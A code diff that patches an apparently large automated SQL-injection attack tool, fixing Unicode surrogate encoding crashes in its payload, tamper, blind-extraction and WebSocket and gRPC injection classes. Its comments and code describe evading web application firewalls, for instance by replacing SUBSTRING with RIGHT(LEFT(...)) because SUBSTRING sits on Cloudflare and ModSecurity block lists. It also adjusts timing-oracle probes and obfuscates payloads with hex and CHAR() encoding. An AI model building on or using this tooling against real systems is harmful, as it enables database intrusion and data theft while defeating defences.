@@ -27193,7 +27193,9 @@ class AdvancedSpider:
                 else:
                     # If body is invalid, use a hash of the decoded string instead
                     if body:
-                        body_hash = hashlib.md5(body.encode('utf-8')[:4096]).hexdigest()
+                        # BUG-BODY-HASH-SURROGATE FIX: body may contain lone surrogates from
+                        # malformed server response; surrogatepass prevents UnicodeEncodeError.
+                        body_hash = hashlib.md5(body.encode('utf-8', errors='surrogatepass')[:4096]).hexdigest()
                         if body_hash in self._content_hashes and _get_safe_status_code(fp) == 200:
                             continue
                         self._content_hashes.add(body_hash)
@@ -29951,7 +29953,9 @@ class TamperLib:
         for c in p:
             if c.isalnum(): r+=c
             else:
-                encoded=c.encode("utf-8")
+                # BUG-UTF8ENCODE-SURROGATE FIX: payload may contain lone surrogates from
+                # binary search; bare .encode("utf-8") crashes — use surrogatepass.
+                encoded=c.encode("utf-8", errors="surrogatepass")
                 r+="".join(f"%{b:02X}" for b in encoded)
         return r
     @staticmethod
@@ -35949,9 +35953,17 @@ async def _send_injected_inner(engine:HTTPEngine, method:str, url:str,
     # so the HTTP layer never raises UnicodeEncodeError.  The encoded form is still
     # valid as a SQL injection carrier — web frameworks decode %XX before parsing SQL.
     if not final.isascii():
+        # BUG-SENDINJ-SURROGATE FIX (CRITICAL): lone surrogates (U+D800..U+DFFF) can appear in
+        # `final` when the injection point's original parameter value was decoded from a malformed
+        # server response or URL, or when the nofunc binary search prefix contains surrogate
+        # characters that were not properly filtered.  Bare c.encode('utf-8') raises
+        # UnicodeEncodeError → the crash propagates up to the Orchestrator and silently aborts
+        # all timing-based extraction (log: "'utf-8' codec can't encode character '\\udcfd'...").
+        # Fix: use surrogatepass so lone surrogates are encoded to their CESU-8 byte sequence
+        # (3 bytes: ED xx xx), which is what web frameworks expect from malformed UTF-8 inputs.
         final = ''.join(
             c if c.isascii()
-            else ''.join(f'%{b:02X}' for b in c.encode('utf-8'))
+            else ''.join(f'%{b:02X}' for b in c.encode('utf-8', errors='surrogatepass'))
             for c in final
         )
     if method in ("GET","HEAD","DELETE") or not data:
@@ -49222,12 +49234,14 @@ class Enumerator:
                     # This incorrectly aborts the timing fallback oracle even though the bypass
                     # template itself works (confirmed by DP-timing oracle during detection).
                     # Fix: retry validation with nofunc-compatible conditions (no parentheses):
-                    #   True  → 'a'<'b'  (always true in all DBMSes, no function calls)
-                    #   False → 'a'>'b'  (always false in all DBMSes, no function calls)
-                    # These bypass WAF rules that block identifier( patterns, allowing
-                    # the timing oracle to validate on targets where ISNULL( is blocked.
-                    _tf_nofunc_true  = "'a'<'b'"
-                    _tf_nofunc_false = "'a'>'b'"
+                    #   True  → 1<2  (always true in all DBMSes, no function calls, no quotes)
+                    #   False → 1>2  (always false in all DBMSes, no function calls, no quotes)
+                    # BUG-NOFUNC-ORACLE-QUOTE FIX: 'a'<'b' / 'a'>'b' contain single quotes that
+                    # terminate the outer SQL string context when embedded in injection payloads,
+                    # causing syntax errors → both probes return fast (no sleep) → both False →
+                    # oracle incorrectly rejected. Replace with integer comparisons (no quotes).
+                    _tf_nofunc_true  = "1<2"
+                    _tf_nofunc_false = "1>2"
                     _tf_nofunc_discriminates = False
                     _tf_nofunc_t = None
                     _tf_nofunc_f = None
@@ -50158,7 +50172,9 @@ class Enumerator:
                 test_prefix = prefix + chr(mid + 1)
                 # Dollar-quote for PostgreSQL, hex for MySQL/MSSQL
                 if self.dbms in ("MySQL", "MariaDB", "MSSQL"):
-                    _hex = test_prefix.encode("utf-8").hex()
+                    # BUG-CHAMELEON-SURROGATE FIX: MSSQL char_hi=65535 includes surrogate range;
+                    # bare .encode("utf-8") crashes on lone surrogates — use surrogatepass.
+                    _hex = test_prefix.encode("utf-8", errors="surrogatepass").hex()
                     val_literal = f"0x{_hex}"
                 elif self.dbms == "SQLite":
                     # BUG-EXT-6B FIX: was X'{_hex}' (BLOB literal). In SQLite,
@@ -89908,7 +89924,9 @@ class GRPCWebInjector:
                     if _SCAN_STOPPED[0]: break  # BUG-7 FIX
                     await asyncio.sleep(0.001)  # BUG-R9-A FIX: real 1ms yield
                     payload = _grpc_mutator.mutate_all(payload, technique="E")  # FIX-R6: 20 layers, correct technique
-                    injected_val = (original_str + payload).encode("utf-8")
+                    # BUG-GRPC-SURROGATE FIX: original_str may decode with surrogates from
+                    # a malformed server protobuf field; surrogatepass prevents crash.
+                    injected_val = (original_str + payload).encode("utf-8", errors="surrogatepass")
                     new_fields   = list(fields)
                     new_fields[idx] = (fnum, wtype, injected_val)
                     inj_proto    = self.encode_message(new_fields)
@@ -141463,7 +141481,9 @@ class SideChannelExtractor:
         # quoting, which TiDB accepts identically to MySQL (MySQL-wire-compatible).
         if self.dbms in ("MySQL", "MariaDB", "TiDB"):  # BUG-V157-SCE-TIDB-DOLLAR-QUOTE FIX
             # MySQL/MariaDB/TiDB: hex literal treated as binary string — correct for string comparisons
-            return "0x" + val.encode("utf-8").hex()
+            # BUG-SCE-SURROGATE FIX: lone surrogates (U+D800–U+DFFF) arise from ORD()-based binary
+            # search spanning full Unicode range; bare .encode("utf-8") crashes — use surrogatepass.
+            return "0x" + val.encode("utf-8", errors="surrogatepass").hex()
         elif self.dbms == "MSSQL":
             # MSSQL: N'...' unicode literal with doubled single-quotes for escaping
             return "N'" + val.replace("'", "''") + "'"
@@ -142064,7 +142084,9 @@ class SideChannelExtractor:
                 # BUG-BYTEA-SUBSTRING-WAF FIX: SUBSTRING keyword is in Cloudflare and ModSec
                 # WAF block-lists as a direct SQL extraction fingerprint. Use RIGHT(LEFT(...))
                 # which is functionally identical but not in extraction-function block-lists.
-                _utf8_hex = chr(threshold).encode("utf-8").hex()
+                # BUG-BYTEA-SURROGATE FIX: threshold can fall in surrogate range (0xD800–0xDFFF)
+                # when binary search spans full Unicode; surrogatepass prevents UnicodeEncodeError.
+                _utf8_hex = chr(threshold).encode("utf-8", errors="surrogatepass").hex()
                 if self.dbms == "Amazon Redshift":
                     return (f"RIGHT(LEFT(({expr}),{pos}),1)::BYTEA"
                             f">=TO_VARBYTE('{_utf8_hex}','hex')")
@@ -156799,7 +156821,9 @@ class WSUpgradeBypass:
     @staticmethod
     def build_ws_frame(payload: str) -> bytes:
         """Build a WebSocket text frame containing the payload."""
-        data = payload.encode("utf-8")
+        # BUG-WS-SURROGATE FIX: tamper-mutated payloads may carry lone surrogates;
+        # surrogatepass prevents crash while preserving encoded byte sequence.
+        data = payload.encode("utf-8", errors="surrogatepass")
         frame = bytearray()
         frame.append(0x81)  # FIN + text opcode
         mask_key = bytes(random.randint(0, 255) for _ in range(4))
@@ -163631,7 +163655,9 @@ class BurpRepeaterExporter:
         if ctype:
             hdrs["Content-Type"]   = ctype
         if body:
-            hdrs["Content-Length"] = str(len(body.encode("utf-8")))
+            # BUG-BURP-SURROGATE FIX: body may contain lone surrogates; use surrogatepass so
+            # Content-Length reflects actual encoded byte count without crashing.
+            hdrs["Content-Length"] = str(len(body.encode("utf-8", errors="surrogatepass")))
 
         req_lines = [f"{method.upper()} {path} HTTP/1.1"]
         for k, v in hdrs.items():
@@ -165814,7 +165840,9 @@ class MetamorphicPayloadEngineV18:
             if not content:
                 return m.group(0)
             if random.random() < 0.50:
-                return "0x" + content.encode("utf-8").hex()
+                # BUG-OPSTRENC-SURROGATE FIX: content from extraction may carry lone surrogates;
+                # bare .encode("utf-8") crashes — use surrogatepass.
+                return "0x" + content.encode("utf-8", errors="surrogatepass").hex()
             char_nums = ",".join(str(ord(c)) for c in content)
             return f"CHAR({char_nums})"
         return re.sub(r"'([^']{1,30})'", encode_str, p)
